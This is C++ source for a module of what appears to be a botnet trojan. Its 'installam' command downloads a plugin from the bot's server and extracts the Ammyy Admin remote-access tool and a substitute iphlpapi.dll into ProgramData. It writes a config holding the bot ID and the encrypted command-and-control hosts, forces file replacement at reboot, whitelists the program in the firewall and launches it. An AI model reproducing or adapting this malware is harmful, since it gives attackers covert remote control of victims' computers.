#include "ammyy.h"
#include "BotDebug.h"
#include "BotCore.h"
#include "Plugins.h"
#include <shlobj.h>
#include <shlwapi.h>

namespace Ammyy
{

#define DbgAm(...) PP_DPRINTF("Ammyy: " __VA_ARGS__)

const char* NameCmd = "installam";

static char* GetAppFolder( char* path )
{
	pSHGetFolderPathA( 0, CSIDL_COMMON_APPDATA,  0, 0, path );
	pPathAppendA( path, "ammyy" );
	return path;
}

static DWORD WINAPI ThreadInstallam(void*)
{
	DbgAm( "Скачиваем ammy.plug" );
	BYTE* data = 0;
	DWORD size = 0;
	data = Plugin::Download( "ammy.plug", 0, &size, false );
	if( data )
	{
		//KillBlockingProcesses("aa.exe");
		char tempCab[MAX_PATH], folderAmmy[MAX_PATH];
		File::GetTempName(tempCab);
		File::WriteBufferA( tempCab, data, size );
		DbgAm( "Сохранили ammy.plug в %s", tempCab );
		GetAppFolder(folderAmmy);
		pCreateDirectoryA( folderAmmy, 0 );
		//aa.exe рапаковываем как aa1.exe, чтобы проще сделать переписывае если файл aa.exe занят
		const char* renames[] = { "aa.exe", "aa1.exe", "iphlpapi.dll", "iphlpapi1.dll", 0, 0 };
		if( ExtractCab( tempCab, folderAmmy, renames ) )
		{
			DbgAm( "Распаковали в папку %s", folderAmmy );

			//создаем файл am.cfg
			fwsprintfA pwsprintfA = Get_wsprintfA();
			char* mem = (char*)HEAP::Alloc(1024);
			char* p = mem;
			p += pwsprintfA( mem, "%s\r\n", Bot->UID().t_str() );
#ifdef AzConfigH
			TStrEnum E( GetAzHostsBuf(), AZCONFIG_PARAM_ENCRYPTED_HOSTS, 0);
			while( E.Next() )
				p += pwsprintfA( p, "%s\r\n", E.Line().t_str() );
#endif
			pPathAppendA( folderAmmy, "am.cfg" );
			File::WriteBufferA( folderAmmy, mem, p - mem );
			HEAP::Free(mem);

			pPathRemoveFileSpecA(folderAmmy);
			char pathAA1[MAX_PATH];
			m_lstrcpy( pathAA1, folderAmmy );
			int i = 0;
			while( renames[i] )
			{
				pPathAppendA( folderAmmy, renames[i] );
				pPathAppendA( pathAA1, renames[i + 1] );
				//если файл не перепишется (уже запущен), то перезапишется после ребута
				if( !pMoveFileExA( pathAA1, folderAmmy, MOVEFILE_REPLACE_EXISTING ) )
					pMoveFileExA( pathAA1, folderAmmy, MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );

				pPathRemoveFileSpecA(folderAmmy);
				pPathRemoveFileSpecA(pathAA1);
				i += 2;
			}
			pPathAppendA( folderAmmy, "aa.exe" );
			if( AddAllowedprogram(folderAmmy) )
			{
				RunFileA(folderAmmy);
				DbgAm( "ammy успешно запущен" );
			}
		}
		pDeleteFileA(tempCab);
	}
	return 0;
}

bool Execute(PTaskManager Manager, PCHAR Command, PCHAR Args)
{
	return Install(true);
}

bool Installed()
{
	char path[MAX_PATH];
	GetAppFolder(path);
	pPathAppendA( path, "aa.exe" );
	return File::IsExists(path);
}

bool Install( bool update )
{
	if( update || !Installed() )
	{
	    OSVERSIONINFOA ver;
	    ver.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA); 
	    pGetVersionExA(&ver);
		if( ver.dwMajorVersion < 6 ) //команда работает только для XP
			RunThread( ThreadInstallam, 0 );
	}
	return true;
}

}
